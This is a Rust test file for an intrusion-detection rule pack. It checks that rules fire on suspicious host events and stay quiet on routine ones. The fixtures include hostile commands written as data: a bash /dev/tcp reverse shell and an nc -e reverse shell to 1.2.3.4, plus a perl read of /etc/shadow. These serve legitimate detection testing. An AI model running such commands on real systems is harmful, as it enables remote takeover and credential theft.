#![allow(clippy::unwrap_used, clippy::expect_used)]
use serde_json::{json, Value};
use witness_rules::{load_dir, Engine};

fn pack() -> Engine {
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../rules");
    let r = load_dir(&dir).unwrap();
    assert!(r.errors.is_empty(), "pack errors: {:#?}", r.errors);
    assert!(r.set.rules.len() >= 15, "only {} rules", r.set.rules.len());
    Engine::new(r.set)
}

fn ev_cmd(kind: &str, exe: &str, cmd: &[&str], data: Value) -> Value {
    let mut e = ev(kind, exe, data);
    e["actor"]["cmdline"] = json!(cmd);
    e
}

fn ev(kind: &str, exe: &str, data: Value) -> Value {
    json!({"type": kind, "boot_ns": 1_000_000_000u64, "actor": {"puid": "p1", "ses": 3, "exe": exe, "user": "u"}, "data": data})
}

fn fired(e: &mut Engine, v: &Value) -> Vec<String> {
    e.process_value(1, v)
        .into_iter()
        .map(|a| a.rule_id)
        .collect()
}

#[test]
fn every_pack_rule_loads_and_the_obvious_cases_fire() {
    let mut e = pack();
    let cases = [
        (
            ev(
                "proc_exec",
                "/bin/sh",
                json!({"exe": "/dev/shm/a", "argv": ["a"]}),
            ),
            "witness.exec.from-tmp",
        ),
        (
            ev(
                "proc_exec",
                "/bin/bash",
                json!({"exe": "/bin/bash", "argv": ["bash", "-c", "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"]}),
            ),
            "witness.exec.reverse-shell",
        ),
        (
            ev(
                "proc_exec",
                "/bin/bash",
                json!({"exe": "/bin/bash", "argv": ["bash", "-i"], "stdio": ["socket", "socket", "socket"]}),
            ),
            "witness.exec.shell-on-socket",
        ),
        (
            ev(
                "service_change",
                "",
                json!({"unit": "witnessd.service", "action": "stop", "result": "done"}),
            ),
            "witness.self.service-stopped",
        ),
        (
            ev(
                "integrity_check",
                "",
                json!({"state": "broken", "trigger": "schedule", "problem": "BadHash"}),
            ),
            "witness.self.integrity-failed",
        ),
        (
            ev(
                "proc_exec",
                "/bin/nc",
                json!({"exe": "/usr/bin/nc", "argv": ["nc", "-e", "/bin/sh", "1.2.3.4", "9"]}),
            ),
            "witness.exec.reverse-shell",
        ),
        (
            ev(
                "file_open_read",
                "/usr/bin/cat",
                json!({"path": "/etc/shadow"}),
            ),
            "witness.file.shadow-read",
        ),
        // An interpreter run by hand is still reported.
        (
            ev_cmd(
                "file_open_read",
                "/usr/bin/perl",
                &["perl", "-e", "print <>", "/etc/shadow"],
                json!({"path": "/etc/shadow"}),
            ),
            "witness.file.shadow-read",
        ),
        (
            ev(
                "file_attr",
                "/bin/chmod",
                json!({"path": "/tmp/x", "suid_set": true, "new_mode": 2541}),
            ),
            "witness.file.suid-set",
        ),
        (
            ev("usb_device", "", json!({"action": "add"})),
            "witness.device.usb-attached",
        ),
        (
            ev("module_load", "/sbin/modprobe", json!({"name": "dummy"})),
            "witness.kernel.module-load",
        ),
        (
            ev(
                "file_hash",
                "/usr/bin/vi",
                json!({"path": "/etc/sudoers.d/x"}),
            ),
            "witness.file.sudoers-changed",
        ),
        (
            ev("authorized_key_change", "", json!({"change": "created"})),
            "witness.ssh.authorized-key-added",
        ),
        (
            ev(
                "account_change",
                "",
                json!({"kind": "user", "change": "created", "name": "m", "id": 0}),
            ),
            "witness.account.uid0",
        ),
        (
            ev(
                "account_change",
                "",
                json!({"kind": "user", "change": "created", "name": "m", "id": 1001}),
            ),
            "witness.account.created",
        ),
        (
            ev(
                "file_create",
                "/bin/sh",
                json!({"path": "/etc/cron.d/evil"}),
            ),
            "witness.persistence.scheduler-file",
        ),
        (
            ev("clock_change", "", json!({"kind": "step", "delta_ns": 5})),
            "witness.system.clock-step",
        ),
        (
            ev(
                "sudo",
                "",
                json!({"allowed": false, "user": "a", "command": "x", "raw": "r"}),
            ),
            "witness.auth.sudo-denied",
        ),
        (
            ev(
                "file_delete",
                "/usr/bin/rm",
                json!({"path": "/var/lib/witness/segments/seg-1"}),
            ),
            "witness.self.evidence-touched",
        ),
        (
            ev(
                "file_create",
                "/bin/sh",
                json!({"path": "/etc/systemd/system/witnessd.service.d/x.conf"}),
            ),
            "witness.self.service-unit-changed",
        ),
    ];
    for (event, want) in &cases {
        let got = fired(&mut pack(), event);
        assert!(
            got.iter().any(|g| g == want),
            "{want} did not fire; got {got:?}"
        );
    }
    let _ = &mut e;
}

#[test]
fn ordinary_activity_is_quiet() {
    let mut e = pack();
    let quiet = [
        ev(
            "proc_exec",
            "/bin/sh",
            json!({"exe": "/usr/bin/ls", "argv": ["ls", "-l"]}),
        ),
        ev(
            "file_open_read",
            "/usr/sbin/sshd",
            json!({"path": "/etc/shadow"}),
        ),
        ev(
            "service_change",
            "",
            json!({"unit": "witnessd.service", "action": "start", "result": "done"}),
        ),
        ev(
            "integrity_check",
            "",
            json!({"state": "ok", "trigger": "schedule"}),
        ),
        ev(
            "service_change",
            "",
            json!({"unit": "cron.service", "action": "stop", "result": "done"}),
        ),
        // A shell on a tty or pipes, or a non-shell on a socket (an ordinary network service),
        // is normal.
        ev(
            "proc_exec",
            "/bin/bash",
            json!({"exe": "/bin/bash", "argv": ["bash"], "stdio": ["tty", "tty", "tty"]}),
        ),
        ev(
            "proc_exec",
            "/bin/sh",
            json!({"exe": "/bin/sh", "argv": ["sh", "-c", "x"], "stdio": ["pipe", "pipe", "pipe"]}),
        ),
        ev(
            "proc_exec",
            "/usr/sbin/sshd",
            json!({"exe": "/usr/sbin/sshd", "argv": ["sshd"], "stdio": ["socket", "socket", "socket"]}),
        ),
        // `sg` is newgrp, which reads shadow for group passwords (seen on Ubuntu 22.04).
        ev(
            "file_open_read",
            "/usr/bin/newgrp",
            json!({"path": "/etc/shadow"}),
        ),
        // Routine root-run scripts that look users up (seen during apt runs and at boot).
        ev_cmd(
            "file_open_read",
            "/usr/bin/perl",
            &["/usr/bin/perl", "-w", "/usr/share/debconf/frontend", "x"],
            json!({"path": "/etc/shadow"}),
        ),
        ev_cmd(
            "file_open_read",
            "/usr/bin/python3.10",
            &["/usr/bin/python3", "/usr/bin/cloud-init", "init"],
            json!({"path": "/etc/shadow"}),
        ),
        ev(
            "file_delete",
            "/usr/bin/witnessd",
            json!({"path": "/var/lib/witness/segments/seg-1"}),
        ),
        ev(
            "file_attr",
            "/bin/chmod",
            json!({"path": "/tmp/x", "suid_set": false, "sgid_set": false, "new_mode": 420}),
        ),
        ev("usb_device", "", json!({"action": "remove"})),
        ev(
            "account_change",
            "",
            json!({"kind": "user", "change": "modified", "name": "root", "id": 0}),
        ),
    ];
    for q in &quiet {
        let got = fired(&mut e, q);
        assert!(got.is_empty(), "{q} fired {got:?}");
    }
}
